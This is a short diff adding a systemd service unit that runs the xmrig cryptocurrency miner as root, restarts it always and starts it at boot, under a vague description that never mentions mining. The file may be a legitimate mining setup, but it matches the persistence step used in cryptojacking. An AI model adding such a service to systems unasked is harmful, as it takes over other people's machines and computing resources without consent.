@@ -1,0 +1,16 @@
+[Unit]
+Description=A service to run the a binary with custom arguments
+After=network.target
+
+[Service]
+ExecStart=/etc/xmrig/xmrig 
+Restart=always
+User=root
+Group=root
+WorkingDirectory=/usr/local/bin
+StandardOutput=journal
+StandardError=journal
+LimitNOFILE=102400
+
+[Install]
+WantedBy=multi-user.target
